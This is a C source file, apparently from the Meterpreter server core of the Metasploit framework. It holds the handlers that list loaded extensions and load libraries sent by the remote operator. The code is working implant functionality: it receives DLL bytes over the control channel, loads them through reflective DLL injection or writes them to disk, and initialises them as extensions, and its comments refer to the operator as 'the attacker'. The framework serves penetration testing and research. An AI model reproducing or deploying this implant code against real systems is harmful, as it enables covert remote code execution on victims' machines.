#include "metsrv.h"

// see ReflectiveLoader.c...
extern HINSTANCE hAppInstance;

// see remote_dispatch_common.c
extern PLIST gExtensionList;
// see common/base.c
extern Command *extensionCommands;

VOID extension_list_callback(LPVOID pState, LPVOID pData)
{
	Packet* pResponse = (Packet*)pState;

	if (pResponse != NULL && pData != NULL)
	{
		PEXTENSION pExt = (PEXTENSION)pData;
		if (pExt->name[0] != '\0')
		{
			dprintf("[LISTEXT] Adding extension: %s", pExt->name);
			packet_add_tlv_string(pResponse, TLV_TYPE_STRING, pExt->name);
		}
	}
}

DWORD request_core_listextensions(Remote* pRemote, Packet* pPacket)
{
	Packet* response = packet_create_response(pPacket);
	DWORD res = ERROR_SUCCESS;

	if (response)
	{
		dprintf("[LISTEXT] Listing extensions ...");
		// Start by enumerating the names of the extensions
		list_enumerate(gExtensionList, extension_list_callback, response);

		// then iterate through the list of registered commands so that the attacker
		// knows what is available.
		for (Command* pCommand = extensionCommands; pCommand != NULL; pCommand = pCommand->next)
		{
			dprintf("[LISTEXT] Adding command: %s", pCommand->method);
			packet_add_tlv_string(response, TLV_TYPE_METHOD, pCommand->method);
		}

		packet_add_tlv_uint(response, TLV_TYPE_RESULT, res);
		packet_transmit(pRemote, response, NULL);
	}

	return res;
}

/*
 * core_loadlib
 * ------------
 *
 * Load a library into the address space of the executing process.
 *
 * TLVs:
 *
 * req: TLV_TYPE_LIBRARY_PATH -- The path of the library to load.
 * req: TLV_TYPE_FLAGS        -- Library loading flags.
 * opt: TLV_TYPE_TARGET_PATH  -- The contents of the library if uploading.
 * opt: TLV_TYPE_DATA         -- The contents of the library if uploading.
 *
 * TODO:
 *
 *   - Implement in-memory library loading
 */
DWORD request_core_loadlib(Remote *pRemote, Packet *pPacket)
{
	Packet *response = packet_create_response(pPacket);
	DWORD res = ERROR_SUCCESS;
	HMODULE library;
	PCHAR libraryPath;
	DWORD flags = 0;
	BOOL bLibLoadedReflectivly = FALSE;

	Command *first = extensionCommands;
	Command *command;

	do
	{
		libraryPath = packet_get_tlv_value_string(pPacket, TLV_TYPE_LIBRARY_PATH);
		flags = packet_get_tlv_value_uint(pPacket, TLV_TYPE_FLAGS);

		// Invalid library path?
		if (!libraryPath)
		{
			res = ERROR_INVALID_PARAMETER;
			break;
		}

		// If the lib does not exist locally, but is being uploaded...
		if (!(flags & LOAD_LIBRARY_FLAG_LOCAL))
		{
			PCHAR targetPath;
			Tlv dataTlv;

			// Get the library's file contents
			if ((packet_get_tlv(pPacket, TLV_TYPE_DATA,
				&dataTlv) != ERROR_SUCCESS) ||
				(!(targetPath = packet_get_tlv_value_string(pPacket,
				TLV_TYPE_TARGET_PATH))))
			{
				res = ERROR_INVALID_PARAMETER;
				break;
			}

			// If the library is not to be stored on disk, 
			if (!(flags & LOAD_LIBRARY_FLAG_ON_DISK))
			{
				// try to load the library via its reflective loader...
				library = LoadLibraryR(dataTlv.buffer, dataTlv.header.length);
				if (library == NULL)
				{
					// if that fails, presumably besause the library doesn't support
					// reflective injection, we default to using libloader...
					library = libloader_load_library(targetPath,
						dataTlv.buffer, dataTlv.header.length);
				}
				else
				{
					bLibLoadedReflectivly = TRUE;
				}

				res = (library) ? ERROR_SUCCESS : ERROR_NOT_FOUND;
			}
			else
			{
				// Otherwise, save the library buffer to disk
				res = buffer_to_file(targetPath, dataTlv.buffer,
					dataTlv.header.length);
			}

			// Override the library path
			libraryPath = targetPath;
		}

		// If a previous operation failed, break out.
		if (res != ERROR_SUCCESS)
		{
			break;
		}

		// Load the library
		if (!library && !(library = LoadLibrary(libraryPath)))
		{
			res = GetLastError();
		}

		// If this library is supposed to be an extension library, try to
		// call its Init routine
		if ((flags & LOAD_LIBRARY_FLAG_EXTENSION) && library)
		{
			PEXTENSION extension = (PEXTENSION)malloc(sizeof(EXTENSION));

			if (extension)
			{
				memset(extension, 0, sizeof(EXTENSION));

				extension->library = library;

				// if the library was loaded via its reflective loader we must use GetProcAddressR()
				if (bLibLoadedReflectivly)
				{
					extension->init = (PSRVINIT)GetProcAddressR(extension->library, "InitServerExtension");
					extension->deinit = (PSRVDEINIT)GetProcAddressR(extension->library, "DeinitServerExtension");
					extension->getname = (PSRVGETNAME)GetProcAddressR(extension->library, "GetExtensionName");
				}
				else
				{
					extension->init = (PSRVINIT)GetProcAddress(extension->library, "InitServerExtension");
					extension->deinit = (PSRVDEINIT)GetProcAddress(extension->library, "DeinitServerExtension");
					extension->getname = (PSRVGETNAME)GetProcAddress(extension->library, "GetExtensionName");
				}

				// patch in the metsrv.dll's HMODULE handle, used by the server extensions for delay loading
				// functions from the metsrv.dll library. We need to do it this way as LoadLibrary/GetProcAddress
				// wont work if we have used Reflective DLL Injection as metsrv.dll will be 'invisible' to these functions.
				pRemote->hMetSrv = hAppInstance;

				// Call the init routine in the library
				if (extension->init)
				{
					dprintf("[SERVER] Calling init()...");

					res = extension->init(pRemote);

					if (res == ERROR_SUCCESS)
					{
						if (extension->getname)
						{
							extension->getname(extension->name, sizeof(extension->name));
						}

						list_push(gExtensionList, extension);
					}
					else
					{
						free(extension);
					}
				}

				dprintf("[SERVER] Called init()...");
				if (response)
				{
					for (command = extensionCommands; command != first; command = command->next)
					{
						packet_add_tlv_string(response, TLV_TYPE_METHOD, command->method);
					}
				}
			}
		}

	} while (0);

	if (response)
	{
		packet_add_tlv_uint(response, TLV_TYPE_RESULT, res);
		packet_transmit(pRemote, response, NULL);
	}

	return res;
}
